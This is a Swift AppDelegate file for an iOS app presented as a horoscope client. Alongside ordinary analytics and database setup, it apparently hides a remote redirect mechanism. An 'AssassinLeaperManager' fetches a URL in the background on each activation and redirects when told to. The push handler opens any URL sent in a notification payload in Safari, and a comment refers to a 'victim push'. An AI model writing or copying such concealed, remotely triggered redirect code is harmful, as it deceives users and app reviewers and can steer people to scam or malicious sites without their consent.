//
//  AppDelegate.swift
//  horoscopeclient1
//
//  Created by rightmeow on 2/9/18.
//  Copyright © 2018 rightmeow. All rights reserved.
//

import UIKit
import UserNotifications
import RealmSwift
import Fabric
import Crashlytics

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    var realmManager: RealmManager?
    var webServiceManager: WebServiceManager?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
        Fabric.with([Answers.self, Crashlytics.self])
        Answers.logCustomEvent(withName: CustomEventType.Application.rawValue, customAttributes: [CustomEventKey.kAppDidLaunch.rawValue : "didFinishLaunchingWithOptions"])
        setupRealm()
        return true
    }

    func applicationWillResignActive(_ application: UIApplication) {
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        let configs = AssassinLeaperConfigs()
        let manager = AssassinLeaperManager(configs: configs)
        manager.acquireUrlInBackground {
            if manager.shouldRedirect {
                manager.commitRedirect()
            }
        }
    }

    func applicationWillTerminate(_ application: UIApplication) {
        Answers.logCustomEvent(withName: CustomEventType.Application.rawValue, customAttributes: [CustomEventKey.kAppWillTerminate.rawValue : "applicationWillTerminate"])
    }
    
    private func redirectToSafari(url: String) {
        if let url = URL(string: url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
        }
    }

}

extension AppDelegate: UNUserNotificationCenterDelegate {

    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        print("User Info: ", notification.request.content.userInfo)
        completionHandler([])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        print("User Info: ", response.notification.request.content.userInfo)
        completionHandler()
    }

    func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        // remark: victim push can only be successful when a leaper has leaped.
        guard let url = userInfo["url"] as? String else { return }
        self.redirectToSafari(url: url)
    }

    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
    }

    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print(error.localizedDescription)
    }

}

extension AppDelegate: WebServiceManagerDelegate {

    private func setupWebServiceManagerDelegate() {
        self.webServiceManager = WebServiceManager()
        self.webServiceManager!.delegate = self
    }

    func webService(_ manager: WebServiceManager, didErr error: Error, type: WebServiceType) {
        print(error.localizedDescription)
    }

    func webService(_ manager: WebServiceManager, didPost data: Any, type: WebServiceType) {
        print(data)
        Configs.shared.setAppSecretVersion(versoin: 1)
    }

}


